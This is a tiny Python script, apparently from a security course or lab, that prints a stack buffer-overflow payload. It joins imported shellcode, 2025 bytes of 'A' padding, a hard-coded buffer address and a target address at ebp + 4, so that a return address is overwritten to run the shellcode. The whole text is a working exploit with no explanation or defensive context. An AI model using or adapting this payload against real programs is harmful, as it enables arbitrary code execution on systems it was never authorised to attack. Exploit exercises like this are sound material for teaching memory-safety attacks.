from shellcode import shellcode
from struct import pack

sh_addr = pack("<I", 0xbffee328) # beginning of the buffer
ret_addr_stored = pack("<I", 0xbffeeb3c) # ebp + 4
print shellcode + 'A' * 2025 + sh_addr + ret_addr_stored